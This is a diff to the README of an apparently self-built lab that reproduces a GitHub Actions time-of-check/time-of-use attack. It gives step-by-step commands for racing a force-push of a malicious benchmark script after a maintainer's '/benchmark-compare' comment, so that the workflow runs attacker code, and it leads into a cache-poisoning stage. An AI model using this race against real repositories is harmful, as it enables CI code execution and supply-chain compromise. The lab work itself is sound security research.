@@ -43,15 +43,35 @@ Maintainer/victim = `FazeMike1/benchmark-toctou-lab`. Attacker fork =
 3. Fork to `mikethebest11-blip/benchmark-toctou-lab`, create branch `attack`, open an
    innocuous PR to the victim's `main`.
 
+## Prerequisite: both repos PUBLIC
+The vuln's precondition is that the fork is public (forks of a public repo are public),
+so the victim's GITHUB_TOKEN can check it out. With private repos the checkout step fails
+with `repository: null/null` / auth error. Make both public first (run in your own shell):
+```
+gh repo edit FazeMike1/benchmark-toctou-lab --visibility public --accept-visibility-change-consequences
+gh repo edit mikethebest11-blip/benchmark-toctou-lab --visibility public --accept-visibility-change-consequences
+```
+
 ## Run — stage 1 (TOCTOU code-exec)
-On the attacker clone, on the `attack` branch:
+IMPORTANT (Git Bash): prefix commands that pass `/benchmark-compare` with
+`MSYS_NO_PATHCONV=1` or Git Bash rewrites the leading `/` into a Windows path and the
+job's `if:` never matches.
+
+Manual, deterministic race (no background poller needed, the 13 s window is wide):
 ```
-VICTIM=FazeMike1/benchmark-toctou-lab PR=<n> BRANCH=attack POLL=1 ./attacker/race.sh
+# 1) attacker clone on 'attack', malicious commit staged locally but UNPUSHED
+cd <attacker-clone>
+git checkout attack && git reset --hard origin/attack
+cp attacker/malicious-run.sh benchmarks/run.sh && git add benchmarks/run.sh && git commit -m "bench tweak"
+# 2) member posts trigger, THEN attacker pushes within the 13 s window:
+MSYS_NO_PATHCONV=1 gh api -X POST repos/FazeMike1/benchmark-toctou-lab/issues/1/comments -f body='/benchmark-compare main'   # as FazeMike1
+git push -f origin attack                                                                                                     # as mikethebest11-blip
 ```
-As `FazeMike1` (the "team member"), comment `/benchmark-compare main` on the PR.
-`race.sh` force-pushes `malicious-run.sh` during the ~13 s window; the victim workflow
-resolves the attacker's live SHA and runs it. Expect `LAB-PROOF.txt` /
-`LAB_CANARY_7F3A executed` in the job log.
+Or just use the driver: `VICTIM=FazeMike1/benchmark-toctou-lab PR=1 BRANCH=attack ./attacker/race.sh`
+(run as the attacker; post the comment as FazeMike1 in another shell).
+
+The victim workflow resolves the attacker's live SHA and runs it. Expect `LAB-PROOF.txt` /
+`LAB_CANARY_7F3A executed` in the job log of the `benchmark-compare (LAB)` run.
 
 ## Run — stage 2 (cache poisoning → publish-snapshots)
 1. Attacker code (stage 1) or the `cache-producer` workflow writes the poisoned entry
